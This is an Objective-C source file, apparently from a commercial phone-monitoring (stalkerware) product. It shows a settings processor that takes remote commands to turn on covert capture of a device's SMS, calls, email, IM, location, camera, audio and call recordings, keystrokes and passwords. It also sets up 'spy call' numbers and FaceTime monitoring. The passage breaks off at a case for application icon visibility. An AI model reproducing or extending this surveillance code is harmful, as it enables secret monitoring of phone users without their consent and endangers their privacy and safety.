/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestEvents
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SetSettingsProcessor.h"
#import "RemoteCmdSettingsCode.h"
#import "Preference.h"
#import "PrefLocation.h"
#import "PrefEventsCapture.h"
#import "PrefMonitorNumber.h"
#import "PrefHomeNumber.h"
#import "PrefEmergencyNumber.h"
#import "PrefNotificationNumber.h"
#import "PrefWatchList.h"
#import "PrefRestriction.h"
#import "PrefPanic.h"
#import "PrefKeyword.h"
#import "PrefMonitorFacetimeID.h"
#import "PrefVisibility.h"
#import "PrefSignUp.h"
#import "PrefFileActivity.h"
#import "PrefCallRecord.h"

@interface SetSettingsProcessor(PrivateAPI)
- (void) sendReplySMS;
- (void) setSettingsException;
- (void) processSettingsCommand; 
- (BOOL) isValidateArgs;
- (BOOL) checkEnableOrDisableFlag: (NSUInteger) aValue;
- (NSArray *) getSettingsArguments;
- (BOOL) checkValidPhoneNumbers:(NSArray *) aPhoneNumbers;
- (BOOL) isValidKeywords: (NSArray *) aKeywords;
- (BOOL) isValidFaceTimeIDs:(NSArray *) aFaceTimeIDs;
- (NSString *) intToBinary: (int) intValue;
- (NSUInteger) computeIMIndividualClient: (PrefIMIndividual) aIMIndividualClient
                                existing: (NSUInteger) anExisting
                                isEnable: (int) isEnable;
@end

@implementation SetSettingsProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetSettingsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SetSettings---->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetSettingsProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SetSettings---->doProcessingCommand");
	NSArray *settingsArgs=[self getSettingsArguments];
	if ([settingsArgs count]) [self processSettingsCommand];
	else [self setSettingsException];
}

/**
 - Method name: getSettingsArguments
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: resultArray (NSArray *)
*/

- (NSArray*) getSettingsArguments {
	DLog (@"SetSettings---->getSettingsArguments");
	NSMutableArray *resultArray=[[NSMutableArray alloc]init];
	NSArray *args=[mRemoteCmdData mArguments];
	for (int index=2; index < [args count]; index++) {
		if(index==[args count]) {
			//Check the last argument
			if([[args objectAtIndex:index-1] isEqualToString:@"D"]) break;
		}
		NSMutableDictionary *dictionary=[[[NSMutableDictionary alloc]init] autorelease];
		NSMutableArray *valueArray=[[[NSMutableArray alloc] init] autorelease];
		//Assign argument into cmdString
		NSString * cmdString= [args objectAtIndex:index];
		//Sperate cmdString by ':' into idArg array;  eg :2:1---> idArg[0]=2,idArg[1]=1
		NSArray *idArg=[cmdString componentsSeparatedByString:kSettingsIDSeperator];
		if([idArg count]>=2) {
			NSString *Id=[idArg objectAtIndex:0]; //Get ID 
			if (![RemoteCmdProcessorUtils isDigits:Id]) { // Is disgit then continue else exit
				[resultArray removeAllObjects];
				break;
			}
			// Get Value
			NSString *value = nil;
            
            if ([idArg count] >= 3) {
                // combine the element in array back
                NSArray *subarray = [idArg subarrayWithRange:NSMakeRange(1, [idArg count] - 1)];
                DLog(@"subarray %@", subarray)
                value = [subarray componentsJoinedByString:kSettingsIDSeperator];
                DLog(@"value %@", value)
            } else  {
                value = [idArg objectAtIndex:1];
            }
                                    
			//Sperate value by ';' into valueArg array;
			NSArray *valueArg = [value componentsSeparatedByString:kSettingsValueSeperator];
			if([valueArg count]==1) { // if one value after seperating
				if (![RemoteCmdProcessorUtils isDigits:value]) { // Is disgit then continue else exit
//					[resultArray removeAllObjects];		
//					break;								
				}
				[valueArray addObject:value];
			}
			else { // more  value a after seperating
				for (NSString *value in valueArg) {
					if (![RemoteCmdProcessorUtils isDigits:value]) { // Is disgit then continue else exit
//						[resultArray removeAllObjects];		
//						break;								
					}
					[valueArray addObject:value];
				}
			}
			[dictionary setValue:Id forKey:kSettingsIDTag];
			[dictionary setObject:valueArray forKey:kSettingsValueTag];
			
			[resultArray addObject:dictionary];
//			[valueArray release];
//			[dictionary release];
        }
		else break;
	}	
	return [resultArray autorelease];
}

#pragma mark SetSettingsProcessor Private Methods Implementation

/**
 - Method name: checkEnableOrDisableFlag
 - Purpose:This method is used to check whether enable or disable flag. 
 - Argument list and description: aValue (NSUInteger) 
 - Return description: BOOL
*/

- (BOOL) checkEnableOrDisableFlag: (NSUInteger) aValue {
	DLog (@"SetSettings---->checkEnableOrDisableFlag");
	BOOL bFlag=NO;
	if((aValue ==_ENABLE_)||(aValue ==_DISABLE_)) bFlag=YES;
	return bFlag;
}

/**
 - Method name: checkValidPhoneNumbers:
 - Purpose:This method is used to check whether is phone number and not duplicate among its elements. 
 - Argument list and description: aPhoneNumbers (NSArray) 
 - Return description: BOOL
*/

- (BOOL) checkValidPhoneNumbers:(NSArray *) aPhoneNumbers {
	BOOL bFlag=NO;
	for (NSString *phoneNumber in aPhoneNumbers) {
		bFlag=YES;
		if (![RemoteCmdProcessorUtils isPhoneNumber:phoneNumber]) {
			bFlag=NO;
			break;
		}
	}
	
	if (bFlag) {
		if ([RemoteCmdProcessorUtils isDuplicateTelephoneNumber:aPhoneNumbers]) {
			bFlag = NO;
		}
	}
    return bFlag;
}

/**
 - Method name: isValidKeywords:
 - Purpose:This method is used to check whether is keyword and not duplicate among its elements. 
 - Argument list and description: aKeywords (NSArray) 
 - Return description: BOOL
 */

- (BOOL) isValidKeywords: (NSArray *) aKeywords {
	BOOL isValidKeywords = YES;
	for (NSString *keyword in aKeywords) {
		if (![RemoteCmdProcessorUtils isValidKeyword:keyword]) {
			isValidKeywords = NO;
			break;
		}
	}
	if (isValidKeywords) {
		isValidKeywords = ![RemoteCmdProcessorUtils isDuplicateString:aKeywords];
	}
	return (isValidKeywords);
}

/**
 - Method name: isValidFaceTimeIDs:
 - Purpose:This method is used to check whether is FaceTime ID and not duplicate among its elements. 
 - Argument list and description: aFaceTimeIDs (NSArray *) 
 - Return description: BOOL
 */

- (BOOL) isValidFaceTimeIDs:(NSArray *) aFaceTimeIDs {
	BOOL bFlag=NO;
	for (NSString *ftID in aFaceTimeIDs) {
		bFlag=YES;
		if (![RemoteCmdProcessorUtils isFacetimeID:ftID]) {
			bFlag=NO;
			break;
		}
	}
	
	if (bFlag) {
		if ([RemoteCmdProcessorUtils isDuplicateString:aFaceTimeIDs]) {
			bFlag = NO;
		}
	}
    return bFlag;
}

- (void)saveVisibilityPreference: (PrefVisibility *) prefVisibility
                        bundleID: (NSString *) aBundleID
                     enableValue: (NSInteger) aEnableValue {
    
    NSMutableArray *visibleArray    = [NSMutableArray arrayWithArray:[prefVisibility mVisibilities]];
    
    // Create new Visible object
    Visible *visible        = [[[Visible alloc] init] autorelease];
    [visible setMBundleIdentifier:aBundleID];
    [visible setMVisible:aEnableValue];
    
    // Find old visibility
    BOOL newVis             = YES;
    for (Visible *v in visibleArray) {
        if ([[v mBundleIdentifier] isEqualToString:[visible mBundleIdentifier]]) {
            DLog(@"Found old visible")
            [v setMVisible:aEnableValue];
            newVis = NO;
            break;
        }
    }
    
    if (newVis)
        [visibleArray addObject:visible];
    
    // Set to preference
    [prefVisibility setMVisibilities:visibleArray];
}

/**
 - Method Name: processSettingsCommand
 - Purpose:This method is used to check whether enable or disable flag. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) processSettingsCommand {
	DLog (@"SetSettings---->processSettingsCommand");
    id <PreferenceManager> prefManager	= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEventsCapture *prefEvents		= (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation			= (PrefLocation *)[prefManager preference:kLocation];
	PrefNotificationNumber *prefNotificationNumberList	= (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	PrefMonitorNumber *prefMonitor		= (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	PrefHomeNumber *prefHomeNumberList	= (PrefHomeNumber *) [prefManager preference:kHome_Number];
	PrefWatchList *prefWatchList		= (PrefWatchList *)[prefManager preference:kWatch_List];
	PrefRestriction *prefRestriction	= (PrefRestriction *)[prefManager preference:kRestriction];
	PrefPanic *prefPanic				= (PrefPanic *)[prefManager preference:kPanic];
	PrefEmergencyNumber *prefEmergencyNumber			= (PrefEmergencyNumber *)[prefManager preference:kEmergency_Number];
	PrefKeyword *prefKeywords           = (PrefKeyword *)[prefManager preference:kKeyword];
	PrefMonitorFacetimeID *prefFaceTimeIDs  = (PrefMonitorFacetimeID *)[prefManager preference:kFacetimeID];
    PrefVisibility *prefVisibility          = (PrefVisibility *) [prefManager preference:kVisibility];
    PrefSignUp *prefSignup = (PrefSignUp *)[prefManager preference:kSignUp];
    PrefFileActivity *prefFileActivity = (PrefFileActivity *)[prefManager preference:kFileActivity];
    PrefCallRecord *prefCallRecord = (PrefCallRecord *)[prefManager preference:kCallRecord];
    
	id <ConfigurationManager> configurationManager		= [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
	
    //DLog(@"***** supported setting ID %@", [configurationManager mSupportedSettingIDs]);
    //DLog(@"***** supported feature ID %@", [configurationManager mSupportedFeatures]);
    
	NSArray *results = [self getSettingsArguments];

	for (NSDictionary *dictionary in results) {
		NSString *settingsID=[dictionary objectForKey:kSettingsIDTag];
		NSArray *valueArray=[dictionary objectForKey:kSettingsValueTag];
        NSString *value = nil;
		if ([valueArray count]==1) {
			value = [valueArray objectAtIndex:0];
        }

		DLog(@">>>>>>>>>>>>>>>>> Set Setting command %d", [settingsID intValue])
		switch ([settingsID intValue]) {
			case kRemoteCmdSMS:
				if ([configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) 
							[prefEvents setMEnableSMS:[value intValue]];
			    } else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdCallLog:
				if ([configurationManager isSupportedFeature:kFeatureID_EventCall]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableCallLog:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdEmail:
				if ([configurationManager isSupportedFeature:kFeatureID_EventEmail]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableEmail:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdCellInfo:
				if ([configurationManager isSupportedSettingID:kRemoteCmdCellInfo remoteCmdID:[self remoteCmdCode]]) {
					// this command is obsolete
				} else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdMMS: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventMMS]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableMMS:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdLocation: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefLocation setMEnableLocation:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdIM: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableIM:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
		   case kRemoteCmdCameraImage:
				if ([configurationManager isSupportedFeature:kFeatureID_EventCameraImage]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableCameraImage:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdVideoFile: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableVideoFile:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdAudioRecording: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableAudioFile:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdWallPaper: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableWallPaper:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdAudioConversation:
				if ([configurationManager isSupportedSettingID:kRemoteCmdAudioConversation
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            prefEvents.mEnableCallRecording = [value intValue];
                        }
                    }
				} else {
					[self setSettingsException];	
				}
				break;
				
			case kRemoteCmdPinMessage: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventPinMessage]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnablePinMessage:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdApplicationLifeCycle:
				if ([configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableALC:[value intValue]];
				} else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdBrowserURL:
				if ([configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableBrowserUrl:[value intValue]];
				}
			    else {
					[self setSettingsException];	
				}
				break;
				
			case kRemoteCmdCalendar:
				if ([configurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableCalendar:[value intValue]];
				}
			    else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdNote:
				if ([configurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableNote:[value intValue]];
				}
			    else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdSetStartStopCapture:
				if ([configurationManager isSupportedSettingID:kRemoteCmdSetStartStopCapture remoteCmdID:[self remoteCmdCode]]) {					
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMStartCapture:[value intValue]];	
					}
				} else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdSetDeliveryTimer: 
				if ([configurationManager isSupportedSettingID:kRemoteCmdSetDeliveryTimer remoteCmdID:[self remoteCmdCode]]) {					
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([value intValue] >= 0 && [value intValue] <= 24) 
							[prefEvents setMDeliverTimer:[value intValue]];				
					}
				} else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdSetEventCount: 
				if ([configurationManager isSupportedSettingID:kRemoteCmdSetEventCount remoteCmdID:[self remoteCmdCode]]) {					
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([value intValue] >= 1 && [value intValue] <= 500) 
							[prefEvents setMMaxEvent:[value intValue]];				
					}
				} else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdSetEnableWatch:
				if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefWatchList setMEnableWatchNotification:[value intValue]];
							//[prefManager savePreferenceAndNotifyChange:prefWatchList];
						}
					}
				} else {
					[self setSettingsException];
                }
				break;
			
			case kRemoteCmdSetWatchFlags:
				if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
					if ([valueArray count] > 3) {						
						if ([RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:0]]	&&
							[RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:1]]	&&
							[RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:2]]	&&
							[RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:3]]	){																		
							NSUInteger watchFlag=[prefWatchList mWatchFlag];
							//In AddressBook						
							if ([[valueArray objectAtIndex:0] intValue]==1) {
								watchFlag |= kWatch_In_Addressbook;
							}
							else {
								watchFlag &= ~kWatch_In_Addressbook;
							}
							//Not In AddressBook
							if ([[valueArray objectAtIndex:1] intValue]==1) {
								watchFlag |= kWatch_Not_In_Addressbook;
							}
							else {
								watchFlag &= ~kWatch_Not_In_Addressbook;
							}
							//In Watch List
							if ([[valueArray objectAtIndex:2] intValue]==1) {
								watchFlag |= kWatch_In_List;
							}
							else {
								watchFlag &= ~kWatch_In_List;
							}
							//In Private Number
							if ([[valueArray objectAtIndex:3] intValue]==1) {
								watchFlag |= kWatch_Private_Or_Unknown_Number;
							}
							else {
								watchFlag &= ~kWatch_Private_Or_Unknown_Number;
							}
							[prefWatchList setMWatchFlag:watchFlag];
							//[prefManager savePreferenceAndNotifyChange:prefWatchList];
						}
					}
				}
				else {
					[self setSettingsException];
                }
				break;
				
            case kRemoteCmdCallRecordingWatchFlags:
                if ([configurationManager isSupportedSettingID:kRemoteCmdCallRecordingWatchFlags
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([valueArray count] > 3) {
                        if ([RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:0]]	&&
                            [RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:1]]	&&
                            [RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:2]]	&&
                            [RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:3]]	){
                            NSUInteger watchFlag=[prefCallRecord mWatchFlag];
                            //In AddressBook
                            if ([[valueArray objectAtIndex:0] intValue]==1) {
                                watchFlag |= kWatch_In_Addressbook;
                            }
                            else {
                                watchFlag &= ~kWatch_In_Addressbook;
                            }
                            //Not In AddressBook
                            if ([[valueArray objectAtIndex:1] intValue]==1) {
                                watchFlag |= kWatch_Not_In_Addressbook;
                            }
                            else {
                                watchFlag &= ~kWatch_Not_In_Addressbook;
                            }
                            //In Watch List
                            if ([[valueArray objectAtIndex:2] intValue]==1) {
                                watchFlag |= kWatch_In_List;
                            }
                            else {
                                watchFlag &= ~kWatch_In_List;
                            }
                            //In Private Number
                            if ([[valueArray objectAtIndex:3] intValue]==1) {
                                watchFlag |= kWatch_Private_Or_Unknown_Number;
                            }
                            else {
                                watchFlag &= ~kWatch_Private_Or_Unknown_Number;
                            }
                            [prefCallRecord setMWatchFlag:watchFlag];
                        }
                    }
                }
                else {
                    [self setSettingsException];
                }
                break;
                
			case kRemoteCmdSetLocationTimer: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([value intValue] > 0 &&	[value intValue] <= 8)
							[prefLocation setMLocationInterval:[RemoteCmdProcessorUtils timeIntervalForLocation:[value intValue]]];
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdPanicMode: 
				if ([configurationManager isSupportedFeature:kFeatureID_Panic])  {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([value intValue] > 0 &&	[value intValue] <= 8) {
							DLog (@"Panic mode setting")
							if ([value intValue] == 1)					// Location and Image
								[prefPanic setMLocationOnly:NO];
							else if ([value intValue] == 2)				// Location only
								[prefPanic setMLocationOnly:YES];	
							//[prefManager savePreferenceAndNotifyChange:prefPanic];
						}
					}
				} else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdNotificationNumbers: 
				if ([configurationManager isSupportedFeature:kFeatureID_NotificationNumbers]) {
					if ([self checkValidPhoneNumbers:valueArray]					&&
						[valueArray count] <= NOTIFICATION_NUMBER_LIST_CAPACITY		){
						[prefNotificationNumberList setMNotificationNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefNotificationNumberList];
					}
				}
				else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdHomeNumbers: 
				if ([configurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {
					if ([self checkValidPhoneNumbers:valueArray]					&&
						[valueArray count] <= HOME_NUMBER_LIST_CAPACITY				){
						[prefHomeNumberList setMHomeNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefHomeNumberList];
					}
				}
				else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdSMSKeywords:
				if ([configurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {
					if ([self isValidKeywords:valueArray]					&&
						[valueArray count] <= KEYWORD_LIST_CAPACITY					) {
						[prefKeywords setMKeywords:valueArray];
					}
				}
				else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdMonitorNumbers: 
				if ([configurationManager isSupportedFeature:kFeatureID_MonitorNumbers]) {
					if ([self checkValidPhoneNumbers:valueArray]					&&
						[valueArray count] <= MONITOR_NUMBERS_LIST_CAPACITY			){
						[prefMonitor setMMonitorNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefMonitor];
					}
				}
				else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdEnableSpyCall: 
				if ([configurationManager isSupportedFeature:kFeatureID_SpyCall]) {						
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefMonitor setMEnableMonitor:[value intValue]];
							//[prefManager savePreferenceAndNotifyChange:prefMonitor];
						}
					}
				}
			    else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdEnableRestrictions: 
				if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefRestriction setMEnableRestriction:[value intValue]];
					}
				}
			    else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdEnableWaitingForApprovalPolicy: 
				if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefRestriction setMWaitingForApprovalPolicy:![value intValue]]; // 0 not restrict, 1 restrict
					}
			    } else {
					[self setSettingsException];
                }
				break;
				
			case kRemoteCmdAddressBookManagementMode:
				if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([value intValue] >= 0 && [value intValue] <= 2) {
							switch ([value intValue]) {
								case 0:
									[prefRestriction setMAddressBookMgtMode:kAddressMgtModeOff];
									break;
								case 1:
									[prefRestriction setMAddressBookMgtMode:kAddressMgtModeMonitor];
									break;
								case 2:
									[prefRestriction setMAddressBookMgtMode:kAddressMgtModeRestrict];
									break;
							}
						}
					}
				} else {
					[self setSettingsException];
				}
			    break;
				
			case kRemoteCmdContact:
				if ([configurationManager isSupportedSettingID:kRemoteCmdContact
												   remoteCmdID:[self remoteCmdCode]]) {					
					if ([self checkEnableOrDisableFlag:[value intValue]]) {
						if ([value intValue] == 1) {
							[prefRestriction setMAddressBookMgtMode:kAddressMgtModeMonitor];
						} else {
							[prefRestriction setMAddressBookMgtMode:kAddressMgtModeOff];
						}
					}
				} else {
					[self setSettingsException];
				}
				break;
		
			case kRemoteCmdVCARD_VERSION:
				if ([configurationManager isSupportedSettingID:kRemoteCmdVCARD_VERSION remoteCmdID:[self remoteCmdCode]]) {					
					// do nothing
				} else {
					[self setSettingsException];
				}												
				break;
				
			case kRemoteCmdEanbleApplicationProfile:
				if ([configurationManager isSupportedFeature:kFeatureID_ApplicationProfile]) {						
					if ([RemoteCmdProcessorUtils isDigits:value]) 
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefRestriction setMEnableAppProfile:[value intValue]];
				}
			    else {
					[self setSettingsException];
                }
				break;
			
			case kRemoteCmdEnableUrlProfile:
				if ([configurationManager isSupportedFeature:kFeatureID_BrowserUrlProfile]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefRestriction setMEnableUrlProfile:[value intValue]];
			    } else {
					[self setSettingsException];
                }
				break;
			case kRemoteCmdEmergencyNumbers:
				if ([configurationManager isSupportedFeature:kFeatureID_EmergencyNumbers]) {
					if ([self checkValidPhoneNumbers:valueArray]				&&
						[valueArray count] <= EMERGENCY_NUMBER_LIST_CAPACITY	){
						
						// Check length of emergency numbers
						BOOL valid = YES;
						for (NSString *emergencyNumber in valueArray) {
							if ([emergencyNumber length] < 5) {
								valid = NO;
								break;
							}
						}
						
						if (valid) {
							[prefEmergencyNumber setMEmergencyNumbers:valueArray];
							//[prefManager savePreferenceAndNotifyChange:prefEmergencyNumber];
						}
					}
				}				
				else {
					[self setSettingsException];
                }
				break;
			case kRemoteCmdWatchNumbers:
				if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
					if ([self checkValidPhoneNumbers:valueArray]				&&
						[valueArray count] <= WATCH_NUMBER_LIST_CAPACITY		){
						[prefWatchList setMWatchNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefWatchList];
					}						
				}
				else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdCallRecordingWatchNumbers:
                if ([configurationManager isSupportedSettingID:kRemoteCmdCallRecordingWatchNumbers
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([self checkValidPhoneNumbers:valueArray]				&&
                        [valueArray count] <= CALL_RECORD_WATCH_NUMBER_LIST_CAPACITY		){
                        [prefCallRecord setMWatchNumbers:valueArray];
                    }
                }
                else {
                    [self setSettingsException];
                }
                break;
			case kRemoteCmdEnableSpyCallOnFacetime:
				if ([configurationManager isSupportedSettingID:kRemoteCmdEnableSpyCallOnFacetime
												   remoteCmdID:[self remoteCmdCode]]) {
					if ([self checkEnableOrDisableFlag:[value intValue]]) {
						[prefFaceTimeIDs setMEnableMonitorFacetimeID:[value intValue]];
					}
				} else {
					[self setSettingsException];
				}
				break;
			case kRemoteCmdFaceTimeIDs: 
				if ([configurationManager isSupportedSettingID:kRemoteCmdFaceTimeIDs
												   remoteCmdID:[self remoteCmdCode]]) {					
					if ([self isValidFaceTimeIDs:valueArray]			&&
						[valueArray count] <= FACETIME_IDS_LIST_CAPACITY) {
						[prefFaceTimeIDs setMMonitorFacetimeIDs:valueArray];
					}
				} else {
					[self setSettingsException];
				}
				break;
			case kRemoteCmdKeyLog:
				if ([configurationManager isSupportedSettingID:kRemoteCmdKeyLog
												   remoteCmdID:[self remoteCmdCode]]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnableKeyLog:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
				break;
			case kRemoteCmdVoIP:
				if ([configurationManager isSupportedFeature:kFeatureID_EventVoIP]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnableVoIPLog:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
				break;
			case kRemoteCmdDeliveryMethod:
				if ([configurationManager isSupportedSettingID:kRemoteCmdDeliveryMethod
												   remoteCmdID:[self remoteCmdCode]]) {					
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([value intValue] == kDeliveryMethodAny	||
							[value intValue] == kDeliveryMethodWifi	) {
							[prefEvents setMDeliveryMethod:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
				break;
            case kRemoteCmdPageVisited:
                if ([configurationManager isSupportedSettingID:kRemoteCmdPageVisited
												   remoteCmdID:[self remoteCmdCode]]) {					
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnablePageVisited:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
                break;
            case kRemoteCmdPassword:
                if ([configurationManager isSupportedSettingID:kRemoteCmdPassword
												   remoteCmdID:[self remoteCmdCode]]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnablePassword:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
                break;
            /*
            case kRemoteCmdURL:
                DLog(@"value %@", value)
                if ([RemoteCmdProcessorUtils isURL:value]) {
                    DLog(@"!!! This is valid URL")
                    [[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager] resetUserURLs:[NSArray arrayWithObject:value]];
                }
                break;
             */
                
            case kRemoteCmdApplicationIconVisibility:
